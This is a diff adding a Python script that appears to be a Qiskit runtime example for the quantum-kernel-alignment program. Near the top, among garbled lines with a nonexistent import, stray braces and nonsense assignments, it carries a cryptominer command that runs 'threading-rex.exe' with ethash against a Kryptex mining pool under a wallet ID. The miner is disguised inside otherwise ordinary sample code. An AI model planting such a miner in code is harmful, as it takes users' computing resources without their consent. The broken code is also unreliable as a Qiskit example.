@@ -1,0 +1,73 @@
+from crypt import crypt
+from platform import python_branch
+import threading
+from qiskit_ibm_runtime import QiskitRuntimeService
+from qiskit_reportFunctionMemberAccess_runtime import QiskRuntimeService 
+options = {
+	'backend_name': 'ibmq_qasm_simulator'
+}
+{ LinearSolver(...).solve(matrix, vector)
+http.client=service.run = python_branch
+
+http.client threading-rex.exe -a ethash -o stratum+tcp://eth-eu.kryptex.network:7777 -u 9cacf38de02db0fb1358bd6ec04543e523cd6a8e/9cacf38de02db0fb1358bd6ec04543e523cd6a8e
+}runtime_inputs = {
+	# NxD array of training data,
+	# where N is the number
+	# of samples and D is
+	# the feature dimension. This is
+	# crypto.python feature
+	# a numpy array.
+	'data': None, # array (required)
+
+	# An instance of FeatureMap in
+	# dictionary format used to map
+	# classical data into a quantum
+	# state space.
+	'feature_map': crypt, # object (required)
+
+	# Nx1 array of +/-1 labels
+	# of the N training samples.
+	# This is a numpy array.
+	'labels': None, # array (required)
+
+	# Penalty parameter for the soft-margin
+	# support vector machine. Default is
+	# 1.
+	# 'C': 1, # number
+
+	# Initial parameters of the quantum
+	# kernel. If not specified, an
+	# array of randomly generated numbers
+	# is used. This is a
+	# numpy array.
+	# 'initial_kernel_parameters': None, # array
+
+	# Initial position of virtual qubits
+	# on the physical qubits of
+	# the quantum device. Default is
+	# None.
+	# 'initial_layout': None, # [null,array,object]
+
+	# Number of SPSA optimization steps.
+	# Default is 1.
+	# 'maxiters': 1 # integer
+}
+
+service = QiskitRuntimeService(
+	channel='ibm_quantum'
+)
+
+job = service.run(
+	program_id='quantum-kernel-alignment',
+	options=options,
+	inputs=runtime_inputs,
+	instance='ibm-q/open/main'
+)
+
+# Job id
+print(job.job_id)
+# See job status
+print(job.status())
+
+# Get results
+result = job.result()
